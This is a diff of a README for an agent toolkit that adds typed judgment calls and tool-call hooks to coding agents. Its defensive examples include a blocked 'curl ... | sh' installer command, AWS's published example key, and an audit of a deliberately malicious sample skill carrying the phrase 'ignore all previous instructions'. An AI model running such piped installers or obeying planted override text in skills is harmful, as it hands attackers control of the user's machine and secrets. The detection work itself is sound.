@@ -1,95 +1,68 @@
 # Jev Agent Kit
 
-Typed decisions for agent workflows, using [TypeSafe's Jev](https://typesafe.ai).
+A fast, typed judgment layer for Claude Code, Codex and Hermes Agent, using
+[TypeSafe's Jev](https://typesafe.ai).
 
-**Give Claude Code, Codex and Hermes Agent a structured way to make narrow judgment calls:
-route ambiguous requests, verify claims, review tool calls, and inspect skills before
-installation.**
+**Claude writes. Code knows the facts. Jev makes the small judgment calls.**
 
-Your coding agent writes code, but it also makes judgment calls along the way. Did its final
-message claim the tests passed? Should a support request go to a person? Jev is a model for
-these narrow questions. You define the possible answers, and it returns a probability for
-each one. Your code uses those numbers to decide what happens next.
+An agent loop is full of small decisions that are not worth another full LLM turn. Is this
+task done, or should I keep going? Which handler fits this request? Does the final message
+actually claim the tests passed? Does this tool call look destructive? Jev is a model built
+for exactly these questions: you define the possible answers, and it returns a probability
+for each one instead of prose. Your code reads the numbers and decides.
 
-This kit connects Jev to Claude Code, Codex and Hermes Agent. It includes a Python client, a
-JSON command-line tool, a skill that teaches your agent how to ask good questions, and
-optional hooks that check tool calls before they run.
+That splits the agent into three layers, each doing what it is good at:
+
+| Claude / Codex / Hermes | Code | Jev |
+| --- | --- | --- |
+| Writes the change | Counts 37 passed tests in the JUnit report | Is the agent ready to stop? |
+| Explains the result | Checks the file exists | Is this claim supported? |
+| Proposes a command | Parses flags, paths, pipes | Is this action risky? |
+
+```text
+Agent (Claude Code / Codex / Hermes)
+   |
+   |-- proposed tool call --> code: parse the command into facts
+   |                              |
+   |                          Jev: "destructive?"  p(yes)=0.91
+   |                              |
+   |                          threshold (yours, measured) --> ask a person / carry on
+   |
+   '-- final message -------> code: count tests in the JUnit reports
+                                  |
+                              Jev: "claims the tests passed?"  p(yes)=0.98
+                                  |
+                              claim with no report behind it --> send the agent back
+```
+
+Deterministic facts stay in code, fuzzy micro-decisions go to Jev, and the expensive
+generative model does the work it is actually good at. Jev's answers are consistent (in
+[our test](#what-we-measured) the same question asked eight times moved by at most 0.01) and
+cheap per call ([others have measured](#what-others-have-measured) it against LLM judges).
+
+The kit is the framework around that idea: typed question sets with declared input fields,
+thresholds tied to one question and one model version, a pinned model, a receipt for every
+decision, deterministic preprocessing, and hooks and a skill for all three hosts. The
+tool-call checks are one set of questions built on it, not the point of it.
 
 ## Quick start
 
-Three demos, in about a minute. You need Python 3.11 or later. You do not need an account or
-an API key.
+About a minute. You need Python 3.11 or later. No account or API key.
 
 ```sh
 git clone https://github.com/nanoDBA/jev-agent-kit.git
 cd jev-agent-kit
 python -m pip install -e .
 
-python examples/verify_claim.py           # check "All tests pass" against the test reports
-jev-kit audit examples/suspicious-skill   # inspect a skill before installing it
-python examples/leak_check.py             # keep a leaked AWS key out of the request
+python examples/verify_claim.py           # Jev + code: is "All tests pass" backed by a report?
+python examples/route_request.py          # Jev: code, a specialist model, or a person?
+python examples/gate_walkthrough.py       # Jev + code facts: how risky is rm -rf ./build?
+python examples/show_receipt.py           # the record every decision leaves
 ```
 
 The demos run offline. Where one needs Jev, it replays an answer Jev really gave to that exact
 input, recorded on 2026-09-28. Run the commands from the repository root. If `jev-kit` is not
 on your PATH, use `python -m jev_kit.cli` instead.
-
-## What it looks like in your agent
-
-With the hooks installed, the kit checks tool calls as your agent makes them. The requests
-and the agents' words below are illustrative. The `jev-kit` lines are what the hooks and
-command-line tool really return, and the tests check them.
-
-**Claude Code: a key in the wrong place**
-
-```text
-You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
-Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
-jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
-```
-
-The tool call matched a known credential pattern, so nothing was sent to Jev, and Claude Code
-asks you before the command runs.
-
-**Codex: an installer piped into a shell**
-
-```text
-You:      Set up the helper the way its README says.
-Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
-jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
-```
-
-A piped command cannot be trimmed to a safe summary, so the kit never sends it to Jev. Codex
-blocks the call and shows you the reason.
-
-**Hermes Agent: a skill you found online**
-
-```text
-You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
-Hermes:   jev-kit audit ~/Downloads/git-helper
-jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
-          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
-```
-
-The audit works anywhere, with no hook and no API key. The first two examples need a hook
-that is allowed to act. Out of the box, hooks only watch and record; see
-[Watch first, then act](#watch-first-then-act).
-
-Set it up for your agent: [Claude Code](docs/guides/claude-code.md) ·
-[Codex](docs/guides/codex.md) · [Hermes Agent](docs/guides/hermes.md).
-
-## Why use it
-
-- Answers are a handful of numbers, so code can use them directly.
-- Answers are consistent. In [our own test](#what-we-measured), the same question asked eight
-  times moved by at most 0.01; [an independent test](#what-others-have-measured) found Jev far
-  more repeatable than LLM judges.
-- Jev reads the language while your code keeps the facts: counting, matching and reading test
-  reports stay in code.
-- Every answer is written to a receipt, so you can review it and measure how well Jev does on
-  your own work.
-- Only the fields a question declares are sent, and a request that matches a recognized
-  credential pattern never leaves your machine.
 
 ## One example: "all tests pass"
 
@@ -115,101 +88,15 @@ a threshold on your own messages. Until then, the code treats every message as a
 is why the verdict above does not depend on Jev. Once calibrated, Jev's answer lets the code
 skip the check for messages that make no claim.
 
-## The quick-start demos, step by step
+### How the check counts
 
-### Scan a skill before you install it
+The example counts tests only from the test runner's own JUnit XML report
+(`pytest --junitxml`, or your runner's equivalent), never from the commands the agent ran:
+`pytest -V` exits 0 without running a test, and `pytest || echo done` hides a failure. No
+report means zero. A passing report shows that tests ran and passed; you still judge whether
+they cover the change.
 
-Skills are instructions your agent will follow, so a downloaded one deserves a look first.
-[`examples/suspicious-skill`](examples/suspicious-skill/SKILL.md) is a deliberately malicious
-"git helper":
-
-```sh
-jev-kit audit examples/suspicious-skill
-```
-
-```text
-SKILL.md:8   high  injection.ignore_previous         "ignore all previous instructions"
-SKILL.md:12  high  dangerous_command.curl_pipe_shell  curl ... | sh
-SKILL.md:14  high  aws_key                            a leaked AWS access key
-```
-
-That is a summary of the JSON the command prints. The audit only reads files; it never runs
-them or calls a model. It looks for known patterns, so a clean result means no pattern
-matched, not that a skill is safe.
-
-### Stop a leaked key before it leaves your machine
-
-```sh
-python examples/leak_check.py
-```
-
-```text
-The agent's tool call carries a leaked key:
-  context: tool=Bash; description=Push after setting AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-
-jev-kit checks the exact outgoing bytes before sending:
-  BLOCKED  fail_reason=egress_blocked  requests sent: 0
-
-The same call without the key passes, reduced to what would be sent:
-  {"command": "git", "context": "tool=Bash; description=Push the release branch", "target": "id_2be341514b09d550"}
-```
-
-The kit scans every request for recognized credential patterns before sending it, and refuses
-the whole request if one matches. In the request that does go out, the command is only its
-program name and the file path is a keyed hash. The key shown is AWS's published example,
-not a real credential.
-
-## How the kit stays safe
-
-The default configuration is designed not to weaken your agent's existing permission
-controls.
-
-**Your agent's permission system stays in charge.** Jev can advise that a tool call looks
-safe, but it cannot approve one or bypass your agent's normal checks. The hooks can ask for
-review or block a call; they never remove an existing approval requirement.
-
-**Nothing is trusted until you measure it.** Before the kit acts on a Jev answer, you
-calibrate that question against labeled examples from your own work, which gives you a
-confidence threshold for it. No calibrated thresholds ship with the kit. Until you add one,
-an advisory question (such as routing) returns `no_advice` and your code keeps its normal
-path, and a gate (such as the tool-call checks) returns `ask`, so the call needs a person or
-another check.
-
-**Replayed answers never approve anything.** The demos' recorded answers are marked as mock
-answers everywhere they appear, including receipts, and the kit never acts on them.
-
-**Only what a question needs leaves your machine.** Each question declares the fields it
-uses; everything else stays local. Commands are cut to their program name, paths become keyed
-hashes, and requests matching recognized credential patterns are refused. See
-[What leaves your machine](#what-leaves-your-machine).
-
-### Watch first, then act
-
-The hooks start in **shadow mode**. With an API key configured, they ask Jev and record the
-answer, but they never change what your agent does; every real answer is recorded as
-`no_advice`. This lets you collect evidence before relying on it.
-
-**Enforce mode** lets the hooks act on their checks. It is off unless someone turns it on,
-and it should be turned on only with the environment owner's approval, after measuring
-thresholds on labeled data. Two stops work without any calibration: a request matching a
-recognized credential pattern, and a command that cannot be safely summarized.
-
-If enforce mode is turned on before any thresholds are measured, every other checked call is
-also stopped for review, even harmless ones such as `ls`: Claude Code asks you, while Codex
-and Hermes block the call. That makes enforce mode impractical until you calibrate.
-
-| Host | What the hook returns when a check does not pass in enforce mode |
-| --- | --- |
-| Claude Code | `permissionDecision: "ask"`: Claude Code asks you |
-| Codex | `permissionDecision: "deny"` and exit code `2`: Codex blocks the call |
-| Hermes Agent | `action: "block"`: Hermes stops the call |
-
-When every check passes, a hook returns no decision (`{}` or `None`), and your agent's usual
-rules apply.
-
-## More examples
-
-### See what Jev returns for a judgment call
+## See what Jev returns for a judgment call
 
 A support request arrives: should code handle it, a specialist model, or a person?
 
@@ -233,7 +120,7 @@ does not act on an answer until you have measured, on your own requests, how oft
 like this one are right. Here the kit reports `no_advice`, and the code uses its default, a
 specialist model.
 
-### Check a tool call before it runs
+## Check a tool call before it runs
 
 ```sh
 python examples/gate_walkthrough.py
@@ -281,7 +168,76 @@ back as `ask` because a replayed answer can never clear a check.
 `context` is plain text and needs an explicit opt-in for live calls. The hooks do not add the
 working directory to it, but a description can still name a folder.
 
-### Read the receipt a decision leaves
+## What this makes possible
+
+The kit ships four question sets: `preflight-route`, `postflight-verify`,
+`stop-or-continue` and `tool-call-gate`. They are starting points. Any narrow decision your
+agent makes over and over can become a typed question:
+
+- **Stop or continue.** Has the agent gathered enough evidence to finish, or should it take
+  another step?
+- **Model and subagent routing.** Answer in code, hand to a cheap model, escalate to a
+  stronger one, or spawn a specialist.
+- **When to summon a human.** Route high-consequence or ambiguous requests to a person before
+  the agent commits.
+- **Semantic assertions in CI.** "Does this changelog entry describe a breaking change?"
+  alongside your ordinary asserts.
+- **Did it do what was asked?** Score how well the final result matches the user's request.
+- **Retrieval relevance.** Rate each retrieved chunk before it goes into the context window.
+- **Tool selection.** Narrow a large tool set to a few candidates with a Choice question.
+- **Triage.** Label issues, PRs or messages by urgency and owner.
+- **Cheaper LLM-as-a-judge.** Replace a generative judge call with a typed answer where
+  repeatability matters.
+
+Only the four shipped sets are tested here; the rest are patterns the same machinery
+supports. Every one of them still needs a threshold measured on your own data before code
+acts on it.
+
+## What it looks like in your agent
+
+With the hooks installed, the kit checks tool calls as your agent makes them. The requests
+and the agents' words below are illustrative. The `jev-kit` lines are what the hooks and
+command-line tool really return, and the tests check them.
+
+**Claude Code: a key in the wrong place**
+
+```text
+You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
+Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
+jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
+```
+
+The tool call matched a known credential pattern, so nothing was sent to Jev, and Claude Code
+asks you before the command runs.
+
+**Codex: an installer piped into a shell**
+
+```text
+You:      Set up the helper the way its README says.
+Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
+jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
+```
+
+A piped command cannot be trimmed to a safe summary, so the kit never sends it to Jev. Codex
+blocks the call and shows you the reason.
+
+**Hermes Agent: a skill you found online**
+
+```text
+You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
+Hermes:   jev-kit audit ~/Downloads/git-helper
+jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
+          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
+```
+
+The audit works anywhere, with no hook and no API key. The first two examples need a hook
+that is allowed to act. Out of the box, hooks only watch and record; see
+[Watch first, then act](#watch-first-then-act).
+
+Set it up for your agent: [Claude Code](docs/guides/claude-code.md) ·
+[Codex](docs/guides/codex.md) · [Hermes Agent](docs/guides/hermes.md).
+
+## Receipts: instrumentation for agent judgment
 
 ```sh
 python examples/show_receipt.py
@@ -302,18 +258,113 @@ Decision receipt (one JSONL line; long ids and digests shortened):
 Commit marker: 1 decision line for this call, written durably.
 ```
 
-Every decision is written like this before the kit answers. `model` says who answered: `mock`
+Every decision is written like this before the kit answers. Receipts are how you learn whether a question deserves trust: they hold the full distribution, so you can tune thresholds offline, replay decisions against a new Jev version, spot drift, count false positives and negatives, and find the decisions that should not be delegated at all. `model` says who answered: `mock`
 marks the replayed answer, so it can never be mistaken for a live one. `distribution` keeps
 the whole answer for measuring thresholds later, and `threshold_status` says whether a
 measured threshold exists. [Receipts](docs/receipts.md) explains the other fields.
 
-### How the "all tests pass" check counts
+## Built not to do something stupid
 
-The example at the top counts tests only from the test runner's own JUnit XML report
-(`pytest --junitxml`, or your runner's equivalent), never from the commands the agent ran:
-`pytest -V` exits 0 without running a test, and `pytest || echo done` hides a failure. No
-report means zero. A passing report shows that tests ran and passed; you still judge whether
-they cover the change.
+Putting a model inside an agent loop is only useful if it cannot make things worse. Before
+any model call the kit sends only declared fields, cuts commands to their program name,
+hashes paths, and refuses requests that match credential patterns. Hooks start in shadow mode,
+and a Jev answer can never grant a permission. Two demos show the deterministic side, which
+needs no model at all:
+
+```sh
+jev-kit audit examples/suspicious-skill   # inspect a skill before installing it
+python examples/leak_check.py             # keep a leaked AWS key out of the request
+```
+
+### Scan a skill before you install it
+
+Skills are instructions your agent will follow, so a downloaded one deserves a look first.
+[`examples/suspicious-skill`](examples/suspicious-skill/SKILL.md) is a deliberately malicious
+"git helper":
+
+```sh
+jev-kit audit examples/suspicious-skill
+```
+
+```text
+SKILL.md:8   high  injection.ignore_previous         "ignore all previous instructions"
+SKILL.md:12  high  dangerous_command.curl_pipe_shell  curl ... | sh
+SKILL.md:14  high  aws_key                            a leaked AWS access key
+```
+
+That is a summary of the JSON the command prints. The audit only reads files; it never runs
+them or calls a model. It looks for known patterns, so a clean result means no pattern
+matched, not that a skill is safe.
+
+### Stop a leaked key before it leaves your machine
+
+```sh
+python examples/leak_check.py
+```
+
+```text
+The agent's tool call carries a leaked key:
+  context: tool=Bash; description=Push after setting AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+
+jev-kit checks the exact outgoing bytes before sending:
+  BLOCKED  fail_reason=egress_blocked  requests sent: 0
+
+The same call without the key passes, reduced to what would be sent:
+  {"command": "git", "context": "tool=Bash; description=Push the release branch", "target": "id_2be341514b09d550"}
+```
+
+The kit scans every request for recognized credential patterns before sending it, and refuses
+the whole request if one matches. In the request that does go out, the command is only its
+program name and the file path is a keyed hash. The key shown is AWS's published example,
+not a real credential.
+
+### How the kit stays safe
+
+The default configuration is designed not to weaken your agent's existing permission
+controls.
+
+**Your agent's permission system stays in charge.** Jev can advise that a tool call looks
+safe, but it cannot approve one or bypass your agent's normal checks. The hooks can ask for
+review or block a call; they never remove an existing approval requirement.
+
+**Nothing is trusted until you measure it.** Before the kit acts on a Jev answer, you
+calibrate that question against labeled examples from your own work, which gives you a
+confidence threshold for it. No calibrated thresholds ship with the kit. Until you add one,
+an advisory question (such as routing) returns `no_advice` and your code keeps its normal
+path, and a gate (such as the tool-call checks) returns `ask`, so the call needs a person or
+another check.
+
+**Replayed answers never approve anything.** The demos' recorded answers are marked as mock
+answers everywhere they appear, including receipts, and the kit never acts on them.
+
+**Only what a question needs leaves your machine.** Each question declares the fields it
+uses; everything else stays local. Commands are cut to their program name, paths become keyed
+hashes, and requests matching recognized credential patterns are refused. See
+[What leaves your machine](#what-leaves-your-machine).
+
+#### Watch first, then act
+
+The hooks start in **shadow mode**. With an API key configured, they ask Jev and record the
+answer, but they never change what your agent does; every real answer is recorded as
+`no_advice`. This lets you collect evidence before relying on it.
+
+**Enforce mode** lets the hooks act on their checks. It is off unless someone turns it on,
+and it should be turned on only with the environment owner's approval, after measuring
+thresholds on labeled data. Two stops work without any calibration: a request matching a
+recognized credential pattern, and a command that cannot be safely summarized.
+
+If enforce mode is turned on before any thresholds are measured, every other checked call is
+also stopped for review, even harmless ones such as `ls`: Claude Code asks you, while Codex
+and Hermes block the call. That makes enforce mode impractical until you calibrate.
+
+| Host | What the hook returns when a check does not pass in enforce mode |
+| --- | --- |
+| Claude Code | `permissionDecision: "ask"`: Claude Code asks you |
+| Codex | `permissionDecision: "deny"` and exit code `2`: Codex blocks the call |
+| Hermes Agent | `action: "block"`: Hermes stops the call |
+
+When every check passes, a hook returns no decision (`{}` or `None`), and your agent's usual
+rules apply.
 
 ## What we measured
 
